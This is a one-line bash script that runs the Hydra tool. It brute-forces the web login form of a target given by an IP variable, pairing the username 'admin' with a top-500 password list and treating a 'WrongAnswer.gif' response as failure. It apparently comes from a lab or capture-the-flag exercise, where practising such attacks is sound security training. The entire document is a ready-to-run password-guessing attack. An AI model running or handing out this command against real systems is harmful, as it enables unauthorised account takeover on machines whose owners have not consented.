#!/bin/bash

hydra -l admin -P /root/password_list/10-million-password-list-top-500.txt -F -o hydra.log "$IP_ADDRESS" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'